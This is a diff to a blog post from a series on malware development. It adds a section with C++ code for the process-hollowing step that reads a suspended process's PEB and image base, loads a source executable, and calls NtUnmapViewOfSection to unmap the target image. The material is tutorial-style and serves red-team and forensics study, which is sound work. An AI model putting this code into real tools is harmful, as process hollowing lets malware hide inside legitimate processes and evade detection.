@@ -1,6 +1,6 @@
 ---
 title: 'Malwares Development Series | Part 3 : Process Injection | Process Hollowing'
-published: 2024-07-19
+published: 2024-07-29
 description: ''
 image: ''
 tags: ['Malwares', 'CTF', 'Forensics', 'DFIR', 'RedTeam', 'BlueTeam', 'APT', 'Threat Hunting']
@@ -102,7 +102,63 @@ So as you can see there is two new structures that I used, STARTUPINFOA and PROC
 
 You can find more a about them in Windows APIs documentation here [STARTUPINFOA]('https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa') and here [PROCESS_INFORMATION]('https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information')
 
+### Unmap the target process's memory
 
+So after creating the suspended process, let's Unmap it.
+
+after do that, we should know about the PEB structure, the PEB is a data structure in the Windows operating system that holds information about a process. It includes details such as loaded modules, heap addresses, and the process image base address. Accessing the PEB of a target process is necessary to retrieve this critical information.
+
+So let's take a pointer on the PEB with ReadRemotePEB() and load Image base address from it using ReadRemoteImage().
+
+The purpose of reading the base address of the executable image is to know where the executable image of the process is loaded in memory.
+
+```cpp
+PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
+    PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
+
+    printf("Opening source image\r\n");
+
+    HANDLE hFile = CreateFileA(
+        pSourceFile,
+        GENERIC_READ, 
+        0, 
+        0, 
+        OPEN_ALWAYS, 
+        0, 
+        0
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        printf("Error opening %s\r\n", pSourceFile);
+        return;
+    }
+
+    DWORD dwSize = GetFileSize(hFile, 0);
+    PBYTE pBuffer = new BYTE[dwSize];
+    DWORD dwBytesRead = 0;
+    ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);
+    CloseHandle(hFile);
+    PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
+    PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);
+
+    printf("Unmapping destination section\r\n");
+
+    HMODULE hNTDLL = GetModuleHandleA("ntdll");
+    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
+    _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
+
+    DWORD dwResult = NtUnmapViewOfSection(
+        pProcessInfo->hProcess, 
+        pPEB->ImageBaseAddress
+    );
+
+    if (dwResult)
+    {
+        printf("Error unmapping section\r\n");
+        return;
+    }
+```
 
 
 
